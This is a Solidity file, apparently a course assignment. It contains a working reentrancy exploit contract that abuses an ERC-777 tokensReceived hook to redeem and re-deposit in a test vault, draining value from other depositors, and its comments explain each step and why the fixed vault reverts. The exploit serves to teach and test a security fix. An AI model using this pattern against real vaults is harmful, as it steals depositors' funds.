// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC777Recipient} from "./MockERC777.sol";

/// @title IVaultLike
/// @notice The subset of the vault API shared by `BrokenVault` and `FixedVault`.
/// @dev Declared separately so one attacker contract can be pointed at either vault, which is
///      what makes the "works before the fix, reverts after" comparison a fair one — the
///      exploit code is byte-for-byte identical in both runs.
interface IVaultLike {
    /// @notice Deposits assets and mints shares.
    /// @param assets Amount of underlying to deposit.
    /// @param receiver Address that receives the shares.
    /// @return shares Shares minted.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);

    /// @notice Burns shares and pays out the corresponding assets.
    /// @param shares Amount of shares to burn.
    /// @param receiver Address that receives the assets.
    /// @param owner Address whose shares are burned.
    /// @return assets Assets paid out.
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);

    /// @notice Burns shares and pays out exactly `assets`.
    /// @param assets Amount of underlying to withdraw.
    /// @param receiver Address that receives the assets.
    /// @param owner Address whose shares are burned.
    /// @return shares Shares burned.
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);

    /// @notice Share balance of `account`.
    /// @param account Address to query.
    /// @return Share balance.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Total assets held by the vault.
    /// @return Assets under management.
    function totalAssets() external view returns (uint256);

    /// @notice Total shares outstanding.
    /// @return Share supply.
    function totalSupply() external view returns (uint256);
}

/// @title ReentrancyAttacker
/// @author Assignment submission
/// @notice A working exploit for Bug C: re-enters the vault from the ERC-777 `tokensReceived`
///         hook and walks away with more assets than its shares were ever worth.
/// @dev **The exploit, step by step.** The vault starts at 1,000e18 assets against 1,000e18
///      shares (price 1.0). This contract holds 100e18 of those shares; honest depositors hold
///      the other 900e18.
///
///      1. `attack()` calls `redeem(100e18, this, this)` on the vault.
///      2. `BrokenVault.redeem` computes `assets = 100e18` and **transfers first**. The vault
///         now holds 900e18 assets, but has not burned anything: `totalSupply` is still
///         1,000e18 and this contract still shows a 100e18 share balance.
///      3. The token calls `tokensReceived` on this contract. The vault's books are now
///         internally inconsistent — it thinks 1,000e18 shares are backed by 900e18 assets, so
///         it quotes a share price of 0.9 instead of the true 1.0.
///      4. From inside the hook this contract calls `deposit(100e18)`, paying with the exact
///         assets the vault just sent it. Priced at the fake 0.9, that buys
///         `100e18 * 1000e18 / 900e18 = 111.1e18` shares instead of the honest 100e18.
///      5. The hook returns and the outer `redeem` finally burns 100e18 shares — leaving this
///         contract with ~111.1e18 shares against a vault that is back to 1,000e18 assets.
///      6. `cashOut()` redeems those shares for ~109.9e18 assets.
///
///      Net: 100e18 in, ~109.9e18 out, with the ~9.9e18 difference taken directly from the
///      honest depositors' claims. Note that no capital beyond the original stake is needed —
///      step 4 is funded entirely by the vault's own mid-flight payout.
///
///      Against `FixedVault` the same code reverts: `redeem` burns before it transfers, and
///      `nonReentrant` rejects the nested `deposit` outright.
contract ReentrancyAttacker is IERC777Recipient {
    /// @notice Vault under attack.
    IVaultLike public immutable vault;

    /// @notice Underlying asset (the ERC-777-style token whose hook we abuse).
    IERC20 public immutable token;

    /// @notice Set once the re-entrant deposit has fired, so the hook runs exactly once.
    /// @dev Without this the hook would recurse on the deposit's own transfer and the attack
    ///      would die of gas exhaustion rather than succeeding.
    bool public reentered;

    /// @notice Assets received during the re-entrant window, recorded for the test to assert on.
    uint256 public assetsReceivedDuringCallback;

    /// @notice Share balance observed *during* the callback, before the outer burn.
    /// @dev This is the smoking gun: at this point the vault has already paid out, yet still
    ///      credits the attacker with the full share balance.
    uint256 public shareBalanceDuringCallback;

    /// @param vault_ Address of the vault to attack.
    /// @param token_ Address of the callback-bearing underlying asset.
    constructor(IVaultLike vault_, IERC20 token_) {
        vault = vault_;
        token = token_;
        // Pre-approved so the re-entrant deposit cannot fail for a boring reason.
        token.approve(address(vault_), type(uint256).max);
    }

    /// @notice Opens the honest-looking position the exploit is launched from.
    /// @param assets Amount of underlying to deposit.
    /// @return shares Shares received.
    function openPosition(uint256 assets) external returns (uint256 shares) {
        return vault.deposit(assets, address(this));
    }

    /// @notice Launches the attack.
    /// @param shares Number of shares to redeem in the outer call.
    function attack(uint256 shares) external {
        vault.redeem(shares, address(this), address(this));
    }

    /// @notice Redeems whatever shares survived the attack.
    /// @return assets Assets recovered.
    function cashOut() external returns (uint256 assets) {
        uint256 shares = vault.balanceOf(address(this));
        if (shares == 0) return 0;
        return vault.redeem(shares, address(this), address(this));
    }

    /// @inheritdoc IERC777Recipient
    /// @dev The re-entrant step. Called by the token in the middle of the vault's payout.
    function tokensReceived(address, address from, address, uint256 amount) external override {
        // Only react to money arriving from the vault, and only once.
        if (reentered || from != address(vault)) return;
        reentered = true;

        assetsReceivedDuringCallback = amount;
        shareBalanceDuringCallback = vault.balanceOf(address(this));

        // Buy shares at the vault's temporarily deflated price, using the vault's own money.
        vault.deposit(amount, address(this));
    }
}
